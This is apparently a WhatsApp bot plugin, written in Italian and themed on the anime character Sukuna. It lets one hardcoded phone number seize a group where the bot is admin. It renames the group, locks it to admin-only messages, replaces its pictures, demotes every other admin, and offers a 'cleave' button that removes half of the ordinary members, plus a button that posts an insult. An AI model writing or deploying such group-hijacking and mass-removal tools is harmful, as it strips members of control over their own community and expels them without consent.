import fs from 'fs';
import fetch from 'node-fetch';

const NUMERO_AUTORIZZATO = '66621409462@s.whatsapp.net';

let nomeOriginale = '';
let descrizioneOriginale = '';
let immagineGruppoOriginale = null;
let immagineBotOriginale = null;

let handler = async (m, { conn, command, text }) => {
  if (!m.isGroup) return m.reply('❌ Questo comando funziona solo nei gruppi.');

  const metadata = await conn.groupMetadata(m.chat);
  const botNumber = conn.user.jid;
  const botIsAdmin = metadata.participants.find(p => p.id === botNumber && p.admin);
  if (!botIsAdmin) return m.reply('❌ Il bot deve essere admin.');
  if (m.sender !== NUMERO_AUTORIZZATO) return m.reply('❌ Non sei autorizzato.');

  if (text.toLowerCase().trim() === 'espansione del dominio') {
    nomeOriginale = metadata.subject;
    descrizioneOriginale = metadata.desc || '';

    try {
      immagineGruppoOriginale = await conn.profilePictureUrl(m.chat, 'image');
      immagineBotOriginale = await conn.profilePictureUrl(botNumber, 'image');
    } catch {
      immagineGruppoOriginale = null;
      immagineBotOriginale = null;
    }

    const videoBuffer = fs.readFileSync('./plugins/VID_20250804_064003_384.mp4');
    await conn.sendMessage(m.chat, {
      video: videoBuffer,
      mimetype: 'video/mp4',
      caption: `
╔════════════════════╗
  🩸 *ESPANSIONE DEL DOMINIO* 🩸
╚════════════════════╝

👺 *Sukuna ha preso il controllo del gruppo.*
      `.trim()
    });

    await conn.groupUpdateSubject(m.chat, '👺 Dominio di Sukuna').catch(() => {});
    await conn.groupUpdateDescription(m.chat, 'Questo gruppo è sotto il controllo del Re delle Maledizioni.').catch(() => {});
    await conn.groupSettingUpdate(m.chat, 'announcement');

    const groupImage = await (await fetch('https://www.drcommodore.it/wp-content/uploads/2021/05/avatars-NiUtMH8FHTf66G6K-OgrwNA-t500x500.jpg')).buffer();
    await conn.updateProfilePicture(m.chat, groupImage).catch(() => {});

    const botImage = await (await fetch('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT-r3_AxRHGX65yGOR9ZBp3HMwlLy7P0bZNwA&s')).buffer();
    await conn.updateProfilePicture(botNumber, botImage).catch(() => {});

    const adminList = metadata.participants.filter(p =>
      p.admin === 'admin' &&
      p.id !== botNumber &&
      p.id !== NUMERO_AUTORIZZATO
    ).map(p => p.id);

    for (let id of adminList) {
      await conn.groupParticipantsUpdate(m.chat, [id], 'demote').catch(() => {});
    }

    await conn.sendMessage(m.chat, {
      text: '🛑 *Dominio attivo!*\n\n━━━━━━━━━━━━━━━━━━━━\nPremi un’azione:',
      buttons: [
        { buttonId: 'normalità', buttonText: { displayText: '🔄 Normalità' }, type: 1 },
        { buttonId: 'cleave', buttonText: { displayText: '⚔️ Cleave' }, type: 1 },
        { buttonId: 'dismantle', buttonText: { displayText: '💥 Dismantle' }, type: 1 }
      ],
      footer: '👺 Sukuna',
      headerType: 1
    }, { quoted: m });
  }

  if (command === 'normalità') {
    await conn.groupUpdateSubject(m.chat, nomeOriginale).catch(() => {});
    await conn.groupUpdateDescription(m.chat, descrizioneOriginale).catch(() => {});
    await conn.groupSettingUpdate(m.chat, 'not_announcement');

    if (immagineGruppoOriginale) {
      const img = await (await fetch(immagineGruppoOriginale)).buffer();
      await conn.updateProfilePicture(m.chat, img).catch(() => {});
    }

    if (immagineBotOriginale) {
      const imgBot = await (await fetch(immagineBotOriginale)).buffer();
      await conn.updateProfilePicture(botNumber, imgBot).catch(() => {});
    }

    await conn.sendMessage(m.chat, {
      text: '✅ *Dominio annullato.*\nIl gruppo è tornato alla normalità.'
    });
  }

  if (command === 'cleave') {
    const members = metadata.participants
      .filter(p => !p.admin && p.id !== botNumber)
      .map(p => p.id);
    const half = members.slice(0, Math.floor(members.length / 2));

    for (let id of half) {
      await conn.groupParticipantsUpdate(m.chat, [id], 'remove').catch(() => {});
    }

    await m.reply(`⚔️ Cleave attivato: ${half.length} membri rimossi.`);
  }

  if (command === 'dismantle') {
    await conn.sendMessage(m.chat, { text: `.cornuto` }, { quoted: m });
  }
};

handler.customPrefix = /^espansione del dominio$/i;
handler.command = new RegExp; // nessun comando classico
handler.help = ['espansione del dominio'];
handler.tags = ['group'];

export default handler;